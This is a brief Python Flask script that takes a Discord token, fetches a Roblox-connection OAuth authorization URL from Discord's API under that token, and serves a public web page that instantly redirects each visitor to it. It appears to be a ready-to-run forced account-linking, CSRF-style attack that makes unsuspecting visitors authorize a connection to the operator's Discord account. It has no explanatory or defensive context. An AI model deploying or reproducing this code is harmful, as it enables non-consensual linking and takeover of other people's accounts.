from flask import Flask
import requests

TOKEN = input("Discord Token: ")
app = Flask(__name__)

@app.route("/")
def hello_world():
    href = requests.get('https://canary.discord.com/api/v9/connections/roblox/authorize',
                        headers={'authorization':TOKEN}).json()['url']
    return f'<script>document.location.{href=}</script>'

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)